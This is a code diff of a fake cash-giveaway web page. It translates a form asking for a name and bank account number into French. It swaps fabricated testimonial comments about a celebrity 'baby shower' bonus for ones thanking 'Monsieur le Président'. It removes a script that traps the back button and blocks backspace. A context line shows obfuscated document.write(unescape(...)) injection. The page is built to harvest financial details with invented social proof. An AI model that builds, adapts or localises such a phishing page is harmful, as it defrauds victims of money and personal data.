@@ -549,7 +549,7 @@ font-family: 'Noto Nastaliq Urdu', serif;
             <div class="phone">
                 <form>
                     <div style="margin-bottom: 10px; display: flex; align-items: center;">
-                        <label for="Nom" style="font-weight: bold; width: 80px; margin-right: 8px;">name:</label>
+                        <label for="Nom" style="font-weight: bold; width: 80px; margin-right: 8px;">Nom:</label>
                         <input type="text" id="name" name="name" placeholder="Entrez votre nom" required 
                             style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
                     </div>
@@ -557,7 +557,7 @@ font-family: 'Noto Nastaliq Urdu', serif;
                     
                 
                     <div style="margin-bottom: 10px; display: flex; align-items: center;">
-                        <label for="Numéro de compte:" style="font-weight: bold; width: 80px; margin-right: 8px;">Account number:</label>
+                        <label for="Numéro de compte:" style="font-weight: bold; width: 80px; margin-right: 8px;">Numéro de compte:</label>
                         <input type="number" id="number" name="number" placeholder="Saisissez votre numéro de compte" required 
                             style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
                     </div>
@@ -821,50 +821,7 @@ document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var
     }
 </script>
 
-<script>
-(function (global) {
 
-	if(typeof (global) === "undefined")
-	{
-		throw new Error("window is undefined");
-	}
-
-    var _hash = "!";
-    var noBackPlease = function () {
-        global.location.href += "#";
-
-		// making sure we have the fruit available for juice....
-		// 50 milliseconds for just once do not cost much (^__^)
-        global.setTimeout(function () {
-            global.location.href += "!";
-        }, 50);
-    };
-	
-	// Earlier we had setInerval here....
-    global.onhashchange = function () {
-        if (global.location.hash !== _hash) {
-            global.location.hash = _hash;
-        }
-    };
-
-    global.onload = function () {
-        
-		noBackPlease();
-
-		// disables backspace on page except on input fields and textarea..
-		document.body.onkeydown = function (e) {
-            var elm = e.target.nodeName.toLowerCase();
-            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
-                e.preventDefault();
-            }
-            // stopping event bubbling up the DOM tree..
-            e.stopPropagation();
-        };
-		
-    };
-
-})(window);
-</script>
 <script>
     function generateRandom() {
         const numbers = '0123456789';
@@ -1085,44 +1042,44 @@ const messages = [
     "#38BDF8","#FB923C","#4ADE80","#C084FC","#F97316","#2DD4BF"];
 
    const TOP_COMMENTS = [
-  "Just claimed my 50 000 CFA! Peller & Jarvis baby shower 🔥",
-  "Is this still working? I need that baby shower bonus asap",
-  "Peller & Jarvis, this is how we celebrate your first child 👏",
-  "Just registered, when will the ₦15k drop into my account?",
-  "This is the best baby shower offer I've seen this year!",
-  "Who else just got credited? Let me know 👀",
-  "Peller & Jarvis no dey carry last! Claiming mine now",
-  "Is the offer still open for people outside Lagos?",
-  "Just finished the registration, fingers crossed 🤞",
+  "Je viens de récupérer mes 50 000 CFA !🔥",
+  "Est-ce que ça fonctionne toujours ? J'en ai besoin au plus vite.",
+  "wow  👏",
+  "Je viens de m'inscrire ; quand cela apparaîtra-t-il sur mon compte ?",
+  "Merci, Monsieur le Président, pour ceci.",
+  "Qui d’autre a reçu un crédit ? Dites-le-moi. 👀",
+  "Je prends le mien maintenant",
+  "L'offre est-elle toujours valable pour les personnes intéressées ?",
+  "Je viens de terminer l'inscription ; croisons les doigts. 🤞",
   "50 000 CFA for celebrating Peller & Jarvis baby shower? Count me in!",
-  "This is pure love for the people. Thank you Peller & Jarvis!",
-  "How long does it take for the money to reflect?",
-  "I shared with my family, we all claiming today 😂",
-  "Limited slots ke? I'm not missing this one",
-  "Best decision I made today was clicking that link",
-  "Peller & Jarvis to the world! Baby shower all the way 🙌",
-  "Can confirm it works, just received mine!",
-  "Anyone from Lagos or Abuja claiming too?",
-  "This is how celebrities should celebrate with the people",
-  "Just did it in less than 1 minute. Super easy!"
+  "C’est de l’amour pur pour les gens. Merci.",
+  "Combien de temps faut-il pour que l'argent apparaisse ?",
+  "J'en ai parlé à ma famille ; aujourd'hui, nous en réclamons tous le bénéfice.😂",
+  "Places limitées, c'est ça ? Pas question que je rate ça !",
+  "La meilleure décision que j’ai prise aujourd’hui, c’est d’avoir cliqué sur ce lien.",
+  "Merci, Monsieur le Président.🙌",
+  "Je confirme que ça fonctionne, je viens de recevoir le mien !",
+  "Merci, Monsieur le Président.",
+  "Voici comment aider les gens",
+  "Je viens de le faire en moins d'une minute. Super facile.!"
 ];
 
 const REPLIES = [
-  "Same here, just got mine credited 🔥",
-  "Yes it's still working, hurry before it closes!",
-  "It reflected in less than 10 minutes for me",
-  "I can confirm, just received the ₦15k",
-  "Do it now, slots are finishing fast",
-  "I'm from Lagos and it worked perfectly",
-  "Just tagged my people, everybody should claim",
-  "True talk, Peller & Jarvis dey try for us",
-  "I was doubting at first but it came through",
-  "Already shared in my WhatsApp group",
-  "Yes o, even people outside Lagos are collecting",
-  "Just finished mine too, waiting for alert",
-  "This is the kind of baby shower celebration we like!",
-  "Don't sleep on this one, claim immediately",
-  "I got mine + my wife's. Double win 😂"
+  "Pareil pour moi, je viens de recevoir le crédit. 🔥",
+  "Oui, ça fonctionne toujours ; faites vite avant que ça ne ferme !",
+  "Cela a été pris en compte en moins de 10 minutes dans mon cas.",
+  "Je peux confirmer, je viens de le recevoir.",
+  "Faites-le maintenant, les places partent vite.",
+  "Merci, Monsieur le Président.",
+  "Merci, Monsieur le Président.",
+  "merci",
+  "Au début, j'avais des doutes, mais ça a fini par aboutir.",
+  "Déjà partagé dans mon groupe WhatsApp",
+  "Oui, tout à fait.",
+  "Je viens de terminer le mien aussi, j'attends l'alerte.",
+  "C’est le genre de fête prénatale qu’on aime !",
+  "Ne passez pas à côté, réclamez-le sans attendre.",
+  "J'ai eu le mien et celui de ma femme. Double victoire.😂"
 ];
 
   // Expected image filenames — drop matching files into an "images/" folder
